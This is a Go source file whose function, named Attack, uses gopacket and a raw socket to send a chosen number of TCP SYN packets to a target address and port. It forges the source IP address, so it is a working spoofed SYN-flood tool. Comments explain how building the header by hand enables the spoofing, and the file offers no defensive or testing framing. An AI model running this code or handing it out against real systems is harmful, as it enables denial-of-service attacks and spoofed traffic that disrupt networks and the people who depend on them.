package main

import (
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)

func Attack(src string, dstn string, packets int, port int) {
	defer util.Run()()

	// we'll need to set all the fields needed to use the WriteTo method on the RawConn type
	//https://pkg.go.dev/golang.org/x/net/ipv4#RawConn.WriteTo, this method will allow us manipulate the header & spoof the IP
	//to get the values manually: one can use netcat to send a simple SYN TCP packet, then review the ip header with tcpdump
	//we'll use gopacket and only set the fields we care for, serialize it to a buffer so others fields can be filled and parse that header from the buffer

	ipPreHeader := &layers.IPv4{
		Version:  4,
		SrcIP:    net.ParseIP(src),
		DstIP:    net.ParseIP(dstn),
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
	}
	//seems all TCP fields do need to be filled manually, otherwise returns error: tcp 20 [bad hdr length 0 - too short, < 20]
	tcpHeader := &layers.TCP{
		SrcPort: layers.TCPPort(56578),
		DstPort: layers.TCPPort(port),
		Seq:     69,
		SYN:     true,
		Ack:     0,
		ACK:     false,
		FIN:     false,
		Urgent:  0,
		RST:     false,
		URG:     false,
		ECE:     false,
		CWR:     false,
		NS:      false,
		PSH:     false,
		Window:  420,
	}


	bufIP := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	tcpHeader.SetNetworkLayerForChecksum(ipPreHeader)
	err := ipPreHeader.SerializeTo(bufIP, opts)
	if err != nil {
		fmt.Println("Couldn't serialize IP header. Error: ", err)
	}
	ipHeader, err := ipv4.ParseHeader(bufIP.Bytes())
	if err != nil {
		fmt.Println("Couldn't parse from buffer to IP header. Error: ", err)
	}

	buf := gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buf, opts, tcpHeader)
	if err != nil {
		fmt.Println(" Error: ", err)
	}

	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		fmt.Println(" Error: ", err)
	}

	rawConn, err := ipv4.NewRawConn(conn)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	for i := 0; i <= packets; i++ {

		err := rawConn.WriteTo(ipHeader, buf.Bytes(), nil)
		if err != nil {
			fmt.Println("Couldn't send packet. Error: ", err)
			continue
		}
	}
	conn.Close()

}
